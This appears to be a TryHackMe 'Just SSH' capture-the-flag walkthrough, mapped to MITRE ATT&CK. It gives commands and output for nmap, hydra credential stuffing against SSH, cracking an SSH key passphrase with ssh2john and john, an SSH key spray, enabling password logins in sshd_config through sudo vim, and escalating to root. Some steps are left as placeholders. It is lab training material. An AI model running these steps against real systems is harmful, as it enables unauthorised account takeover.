# Just SSH Walkthrough



## Overview
### Platform: Tryhackme
### Box Name: Just SSH
### Description: 

---
## Recon and Enumeration (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1595](https://attack.mitre.org/techniques/T1595/)                       | Active Scanning               | NMAP                        |
| [T1592](https://attack.mitre.org/techniques/T1592/)                       | Gather Victim Host Information | ssh -v                      |
| [T1591](https://attack.mitre.org/techniques/T1591/)                       | Gather Vicitm Org Information | ssh -v |
| [T1589](https://attack.mitre.org/techniques/T1589/)                       | Gather Victim Identify Information | Breached Creds, Personnel Roster |

### Enumeration
Run NMAP to discover what ports are open on the target:
```bash
sudo nmap $ip -Pn -n -oA discScan
```
```bash         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 00:41 EST
Nmap scan report for 10.10.43.128
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
```
Use SSH's debug mode to identify the pertinent information to the server:  
- protocol
- Version of SSH  
- Banner Information (if present)  
- Authentication Methods  
- Acceptable Keys for Authentication


```bash
ssh -v $ip
```
```bash
debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
debug1: SSH2_MSG_SERVICE_ACCEPT received

**************************************************************************
*                           Nexora Solutions                             *
*                    Secure Shell (SSH) Access Portal                    *
**************************************************************************

NOTICE: This system is for authorized use only. Unauthorized access or use 
is prohibited and may result in disciplinary action and/or civil and 
criminal penalties. All activities on this system are monitored and 
recorded. 

For assistance, contact:
  support@nexora-solutions.com
  j_davis@nexora-solutions.com

debug1: Authentications that can continue: publickey,password
debug1: Will attempt key: /home/not-root/.ssh/id_rsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_xmss 

```
What do we know:  
- SSH Authentication Methods: Publickey and Password  
- Possible Naming Convention: j_davis = f_last

What do we have:  
- Personnel Roster: Task 1  
- Breached Credentials: Task 2  

What can we do:  
- Credential Stuffing

---
---
## Initial Access (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1078](https://attack.mitre.org/techniques/T1078/)    | Valid Accounts    |  Hydra, SSH  |
| [T1110](https://attack.mitre.org/techniques/T1110/004/)   |  Credential Stuffing   |  Hydra   |


### Crafting the Credential Stuffing Attack
Make a users.txt list which reflects the naming convention found on the SSH Banner:  
f_lastName  

  
```bash
j_davis
b_harris
l_jackson
c_thomas
e_Anderson
d_white
a_garcia
j_smith
j_moore
m_brown
m_martin
s_miller
p_martinez
d_wilson
e_johnson
r_taylor
j_thompson
```

With our users.txt and the breached credentials list, we can initiate the Credential Stuffing attack.  
```bash
hydra -L users.txt -P breachedCreds.txt $ip ssh
```

  ```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task
[DATA] attacking ssh://10.10.43.128:22/
[22][ssh] host: 10.10.43.128   login: j_moore   password: **********
[22][ssh] host: 10.10.43.128   login: m_brown   password: **********
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07
```
Use the newly found credentials to gain your initial foothold, and get the userFlag.txt.
```bash
ssh j_moore@$ip
```
```bash
ssh m_brown@$ip
```

---
---
## Lateral Movement (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1021](https://attack.mitre.org/techniques/T1021/004/)    | Remote Services    | SSH    |
| [T1552](https://attack.mitre.org/techniques/T1552/)    | Unsecured Credentials    | Manual Enumeration / LinPEAS.sh    |
| [T1110](https://attack.mitre.org/techniques/T1110/002/)   | Password Cracking   | ssh2john, john/hashcat  |
| [T1110](https://attack.mitre.org/techniques/T1110/003/)    | Password Spraying    | NMAP Scripting Engine    |



### Internal Recon and Enumeration with LinPEAS
Transfer Linpeas to the target computer and run the script using j_moore's profile.
```bash
bash linpeas.sh 
```
Key Information from LinPEAS
- j_moore is part of the sftp_service group
- There are private keys stored on the sftp server and j_moore can access the following keys:
```bash
══╣ Possible private SSH keys were found!
/home/j_moore/.ssh/id_rsa
/home/sftp/uploads/.temp_keys/id_rsa_backup_script
/home/sftp/uploads/.temp_keys/id_rsa_contractor1
/home/sftp/uploads/.temp_keys/id_rsa_audit
```
- Barbara's private key can only be accessed directory from the SFTP service.
```bash
-rw------- 1 sftp sftp_service 3435 Jan  3 01:56 /home/sftp/uploads/.temp_keys/id_rsa_barbara
```
What do we know:
- Nexora-Solutions uses publickeys to access services and accounts
- SSH Key Sprawl is evident and likely.
- j_moore is part of the sftp_service group


What do we have:
- Private Keys for:
  - j_moore
  - m_brown
  - backup_script
  - contractor1
  - audit

What can we do:  
- Test j_moore's private key against sftp service
- Conduct a SSH Key Spray
  
### j_moore, lateral Move to SFTP
Log into the sftp service using j_moore's id_rsa:
```bash
sftp -i id_rsa sftp@$ip
```
```bash
The authenticity of host '10.10.64.168 (10.10.64.168)' can't be established.
ED25519 key fingerprint is SHA256:RPye4zEVR50BH+C2h4qT0zFRbYVknKzA3S/aP0fddoc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.64.168' (ED25519) to the list of known hosts.

**************************************************************************
*                           Nexora Solutions                             *
*                    Secure Shell (SSH) Access Portal                    *
**************************************************************************

NOTICE: This system is for authorized use only. Unauthorized access or use 
is prohibited and may result in disciplinary action and/or civil and 
criminal penalties. All activities on this system are monitored and 
recorded. 

For assistance, contact:
  support@nexora-solutions.com
  j_davis@nexora-solutions.com

Enter passphrase for key 'id_rsa': 
```
Before we can log into the sftp service, we will need to crack the passphrase
associated to the id_rsa key.  

#### cracking ssh passphrases
Step 1: Transfer j_moore's id_rsa to the attack computer.  
Step 2: Utilize ssh2john to output a hash format for John/Hashcat to crack against.
```bash
ssh2john id_rsa_moore > moore.hash
```
Step 3: Use John or Hashcat to crack the hash (assuming it is a weak password). 
```bash
john moore.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********         (id_rsa_moore)     
1g 0:00:00:08 DONE (2025-01-06 01:08) 0.1194g/s 40.14p/s 40.14c/s 40.14C/s nicholas..olivia
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
With the id_rsa passphrase, we can now test j_moore's id_rsa agains the sftp service.
```bash
sftp -i id_rsa sftp@$ip
```
```bash
Enter passphrase for key 'id_rsa': 
Connected to 10.10.64.168.
sftp> 
```

### j_moore Lateral Move to net-admin
Recon of the internal environment provides a likely attack path:  
### What do we know:  
- All users on the target server:
```bash
ls -la /home
```
```bash
drwxr-xr-x 12 root      root      4096 Jan  3 02:23 .
drwxr-xr-x 20 root      root      4096 Dec 28 04:30 ..
drwxr-x---  3 d_wilson  d_wilson  4096 Jan  2 21:08 d_wilson
drwxr-x---  3 e_johnson e_johnson 4096 Jan  2 21:08 e_johnson
drwxr-x---  3 j_davis   j_davis   4096 Jan  2 21:08 j_davis
drwxr-x---  6 j_moore   j_moore   4096 Jan  2 21:36 j_moore
drwxr-x---  3 j_smith   j_smith   4096 Jan  2 21:08 j_smith
drwxr-x---  5 m_brown   m_brown   4096 Jan  2 21:08 m_brown
drwxr-x---  4 net-admin net-admin 4096 Jan  2 21:08 net-admin
drwxr-x---  3 s_miller  s_miller  4096 Jan  2 21:08 s_miller
drwxr-xr-x  4 root      root      4096 Jan  2 21:08 sftp
drwxr-x---  4 sys-admin sys-admin 4096 Jan  2 21:08 sys-admin
```

- j_moore is part of the sftp_service group:
```bash
id
```
```bash
uid=1001(j_moore) gid=1001(j_moore) groups=1001(j_moore),1002(sftp_service)
```
### What do we have:  
- j_moore's private and public key:
```bash
ls -la /home/j_moore/.ssh/
```
- m_brown's private and public key:
```bash
ls -la /home/m_brown/.ssh
```
- Breached Credentials.


### What can we do:
- SSH-Key Spray [+]
- Password Spray [x]
- Brute Force [x]


The nmap scan identifies an additional account that can be accessed via j_moore's id_rsa, the sftp 
account. Confirm the credentials by logging into the sftp service.
```bash
sftp -i id_rsa sftp@$ip
```
enter the passphrase for j_moore's id_rsa, and check your id.
---
---

## Privilege Escalation (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1548](https://attack.mitre.org/techniques/T1548/003/)    | Abuse Elevation Control Mechanism    | Sudo Privileges
| [T1556](https://attack.mitre.org/techniques/T1556/)    | Modify Authentication Process    | /etc/ssh/sshd_config
| [T1110](https://attack.mitre.org/techniques/T1110/004/)    | Credential Stuffing    | hydra    |


### sftp to net-admin
With valid credentials we can enumerate the sftp service and sift through the documents for pertinent 
information. There are two particular documents that indicate a likely attack vector. blah blah blah

```bash
cd /uploads/.tempKeys
get *
```

Given the information from the support tickets, b_harris is a good starting point to conduct a 
key spray attack with. First, set the permissions of b_harris id_rsa:

```bash
chmod 600 id_rsa_harris
```

```bash
sudo nmap long command
```

The key-spray provides access to an additional account, the net-admin.

### net-admin to sys-admin

Now that we have compromised the net-admin account, we can begin the recon and enumeration of the
newly acquired account. A common check is to see what sudo privs a user has:

```bash
sudo -l
```

The net-admin has the ability to start, stop, restart, check status, and edit the sshd_config file. 
Given our permissions, lets see what the current configuration of the ssh server is:

```bash
sudo /usr/bin/vim /etc/ssh/sshd_config
```

The match blocks at the bottom do not allow password logins, only id_rsa. With the keys we have already,
we have reached a dead end. However, we still have breached credentials we can test agains the net-admin, and
sys-admin accounts. Lets see change the server settings so we can execute more credential stuffing attacks:

```bash
passwordAuthentication yes
```

Using the breached password list, conduct a credential stuffing attack against the net-admin and sys-admin
accounts.

```bash
hydar -L admins.txt -P breachedPWD.txt $ip ssh
```

Now we have more credentials, and they belong to the sys-admin account. Log into the account and check your id
and privileges.

```bash
id
sudo -l
```

Paydirt! Sys-admin has no password for sudo, which means we have completely compromised the account. Switch the
user to root and collect your flag.

```bash
sudo su
id
```
